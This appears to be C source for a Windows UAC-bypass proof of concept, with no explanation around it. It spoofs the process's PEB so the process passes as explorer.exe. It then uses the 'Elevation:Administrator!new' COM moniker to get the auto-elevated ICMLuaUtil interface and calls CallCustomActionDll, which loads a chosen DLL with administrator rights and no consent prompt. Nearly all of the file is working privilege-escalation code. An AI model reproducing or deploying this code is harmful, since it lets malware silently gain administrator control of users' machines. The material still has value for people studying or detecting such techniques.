#include <windows.h>
#include <ShlObj.h>
#include <initguid.h>
#include <stdio.h>

DEFINE_GUID(IID_ICMLuaUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

#define DLL_PATH L"C:\\Users\\test\\TestDll\\x64\\Release\\TestDll.dll"
#define EXPORT_NAME L"testFunction"

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef struct _LDR_MODULE {
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID BaseAddress;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    ULONG Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    PVOID Handle;
}CURDIR, * PCURDIR;

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} ANSI_STRING, * PANSI_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    WORD Flags;
    WORD Length;
    ULONG TimeStamp;
    ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID ConsoleHandle;
    ULONG ConsoleFlags;
    PVOID StandardInput;
    PVOID StandardOutput;
    PVOID StandardError;
    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
    ULONG EnvironmentSize;
}RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN Spare;
    HANDLE Mutant;
    PVOID ImageBase;
    PPEB_LDR_DATA LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID FastPebLockRoutine;
    PVOID FastPebUnlockRoutine;
    ULONG EnvironmentUpdateCount;
    PVOID* KernelCallbackTable;
    PVOID EventLogSection;
    PVOID EventLog;
    PVOID FreeList;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[0x2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID ReadOnlySharedMemoryHeap;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;
    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;
    BYTE Spare2[0x4];
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG HeapSegmentReserve;
    ULONG HeapSegmentCommit;
    ULONG HeapDeCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockThreshold;
    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID** ProcessHeaps;
    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    PVOID GdiDCAttributeList;
    PVOID LoaderLock;
    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    ULONG OSBuildNumber;
    ULONG OSPlatformId;
    ULONG ImageSubSystem;
    ULONG ImageSubSystemMajorVersion;
    ULONG ImageSubSystemMinorVersion;
    ULONG GdiHandleBuffer[0x22];
    ULONG PostProcessInitRoutine;
    ULONG TlsExpansionBitmap;
    BYTE TlsExpansionBitmapBits[0x80];
    ULONG SessionId;
} PEB, * PPEB;

PPEB GetPeb(VOID)
{
#if defined(_WIN64)
    return (PPEB)__readgsqword(0x60);
#elif define(_WIN32)
    return (PPEB)__readfsdword(0x30);
#endif
}

PWCHAR StringCopyW(_Inout_ PWCHAR String1, _In_ LPCWSTR String2)
{
    PWCHAR p = String1;

    while ((*p++ = *String2++) != 0);

    return String1;
}

SIZE_T StringLengthW(_In_ LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

PWCHAR StringConcatW(_Inout_ PWCHAR String, _In_ LPCWSTR String2)
{
    StringCopyW(&String[StringLengthW(String)], String2);

    return String;
}

VOID RtlInitUnicodeString(_Inout_ PUNICODE_STRING DestinationString, _In_ PCWSTR SourceString)
{
    SIZE_T DestSize;

    if (SourceString)
    {
        DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else
    {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }

    DestinationString->Buffer = (PWCHAR)SourceString;
}

struct _declspec(uuid("{6EDD6D74-C007-4E75-B76A-E5740995E24C}"))
	ICMLuaUtil : public IUnknown {
	virtual HRESULT __stdcall QueryInterface(REFIID, PVOID*) = 0;
	virtual ULONG __stdcall AddRef() = 0;
	virtual ULONG __stdcall Release() = 0;

	virtual HRESULT  __stdcall SetRasCredentials( LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, int param_4) = 0;
	virtual HRESULT  __stdcall SetRasEntryProperties(LPCWSTR param_1, LPCWSTR param_2, LPCWSTR* param_3, ULONG param_4) = 0;
	virtual HRESULT  __stdcall DeleteRasEntry(LPCWSTR param_1, LPCWSTR param_2) = 0;
	virtual HRESULT  __stdcall LaunchInfSection(LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, int param_4) = 0;
	virtual HRESULT  __stdcall LaunchInfSectionEx(LPCWSTR param_1, LPCWSTR param_2, ULONG param_3) = 0;
	virtual HRESULT  __stdcall CreateLayerDirectory(  LPCWSTR param_1) = 0;
	virtual HRESULT  __stdcall ShellExec(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, ULONG param_4, ULONG param_5) = 0;
	virtual HRESULT  __stdcall SetRegistryStringValue(  int param_1, LPCWSTR param_2, LPCWSTR param_3, LPCWSTR param_4) = 0;
	virtual HRESULT  __stdcall DeleteRegistryStringValue(  int param_1, LPCWSTR param_2, LPCWSTR param_3) = 0;
	virtual HRESULT  __stdcall DeleteRegKeysWithoutSubKeys(  int param_1, LPCWSTR param_2, int param_3) = 0;
	virtual HRESULT  __stdcall DeleteRegTree(  int param_1, LPCWSTR param_2) = 0;
	virtual HRESULT  __stdcall ExitWindowsFunc(  ) = 0;
	virtual HRESULT  __stdcall AllowAccessToTheWorld(  LPCWSTR param_1) = 0;
	virtual HRESULT  __stdcall CreateFileAndClose(  LPCWSTR param_1, ULONG param_2, ULONG param_3, ULONG param_4, ULONG param_5) = 0;
	virtual HRESULT  __stdcall DeleteHiddenCmProfileFiles(  LPCWSTR param_1) = 0;
	virtual HRESULT  __stdcall CallCustomActionDll(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, LPCWSTR param_4, ULONG* param_5) = 0;
	virtual HRESULT  __stdcall RunCustomActionExe(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR* param_3) = 0;
	virtual HRESULT  __stdcall SetRasSubEntryProperties(  LPCWSTR param_1, LPCWSTR param_2, ULONG param_3, LPCWSTR* param_4, ULONG param_5) = 0;
	virtual HRESULT  __stdcall DeleteRasSubEntry(  LPCWSTR param_1, LPCWSTR param_2, ULONG param_3) = 0;
	virtual HRESULT  __stdcall SetCustomAuthData(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, ULONG param_4) = 0;

};

PWSTR g_lpszExplorer = NULL;


BOOL MasqueradePebAsExplorer(PWCHAR* Buffer)
{
    typedef NTSTATUS(NTAPI* RTLENTERCRITICALSECTION)(PRTL_CRITICAL_SECTION);
    typedef NTSTATUS(NTAPI* RTLLEAVECRITICALSECTION)(PRTL_CRITICAL_SECTION);
    RTLENTERCRITICALSECTION RtlEnterCriticalSection = NULL;
    RTLLEAVECRITICALSECTION RtlLeaveCriticalSection = NULL;

    HMODULE Module = NULL;
    LPWSTR WindowsPath = NULL;

    PPEB Peb = GetPeb();

    PLDR_MODULE InMemoryBinaryLoaderData = NULL;

    Module = GetModuleHandleA("ntdll.dll");
    if (Module == NULL)
        goto EXIT_ROUTINE;

    RtlEnterCriticalSection = (RTLENTERCRITICALSECTION)GetProcAddress(Module, "RtlEnterCriticalSection");
    RtlLeaveCriticalSection = (RTLLEAVECRITICALSECTION)GetProcAddress(Module, "RtlLeaveCriticalSection");

    if (!RtlEnterCriticalSection || !RtlLeaveCriticalSection)
        goto EXIT_ROUTINE;

    if (!SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Windows, 0, NULL, &WindowsPath)))
        goto EXIT_ROUTINE;

    *Buffer = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR));
    if (*Buffer == NULL)
        goto EXIT_ROUTINE;

    if (StringCopyW(*Buffer, WindowsPath) == NULL)
        goto EXIT_ROUTINE;

    if (StringConcatW(*Buffer, (PWCHAR)L"\\explorer.exe") == NULL)
        goto EXIT_ROUTINE;

    InMemoryBinaryLoaderData = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink - 16);

    RtlEnterCriticalSection((PRTL_CRITICAL_SECTION)Peb->FastPebLock);

    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, *Buffer);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, *Buffer);

    RtlInitUnicodeString(&InMemoryBinaryLoaderData->FullDllName, *Buffer);
    RtlInitUnicodeString(&InMemoryBinaryLoaderData->BaseDllName, *Buffer);

    RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)Peb->FastPebLock);

EXIT_ROUTINE:

    if (WindowsPath)
        CoTaskMemFree(WindowsPath);

    return TRUE;
}


int main()
{
	HRESULT hResult = S_OK;
	PWCHAR Buffer = NULL;
	LPCWSTR Out = NULL;
	ICMLuaUtil* Util = NULL;
    ULONG* outParam = (ULONG*)malloc(sizeof(ULONG));
    HMODULE hModule = NULL;
    *outParam = 0;

    LPCWSTR dllPath = DLL_PATH;
    LPCWSTR exportName = EXPORT_NAME;
    LPCWSTR param3 = L"ThisIsTestArgument";
    LPCWSTR param4 = L"";


	WCHAR ElevationMonikerString[200] = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
	BIND_OPTS3 BindOpts;






	ZeroMemory(&BindOpts, sizeof(BindOpts));

    BindOpts.cbStruct = sizeof(BindOpts);
    BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;


    if (!MasqueradePebAsExplorer(&Buffer))
    {
        printf("[-] MasqueradePebAsExplorer Failed");
        goto _EXIT_ROUTINE;
    }


    hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (!SUCCEEDED(hResult))
    {
        printf("[-] CoInitializeEx Failed With Error: 0x%08X\n", hResult);
        goto _EXIT_ROUTINE;
    }


    hResult = CoGetObject(ElevationMonikerString, &BindOpts, IID_ICMLuaUtil, (PVOID*)&Util);
    if (!SUCCEEDED(hResult))
    {
        printf("[+] CoGetObject Failed With Error 0x%08X\n", hResult);
        goto _EXIT_ROUTINE;
    }


    hResult = Util->CallCustomActionDll(dllPath, exportName, param3, param4, outParam);
    if (!SUCCEEDED(hResult))
        printf("[-] CallCustomActionDll Failed With Error 0x%08X\n", hResult);
    else
        printf("[+] CallCustomActionDll Succeeded\n[+] outPram: 0x%08X\n", outParam);


_EXIT_ROUTINE:
    if (Buffer)
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

    if (Out)
        CoTaskMemFree((LPVOID)Out);

    if (Util)
        Util->Release();

    CoUninitialize();

    return ERROR_SUCCESS;

	return 0;
}
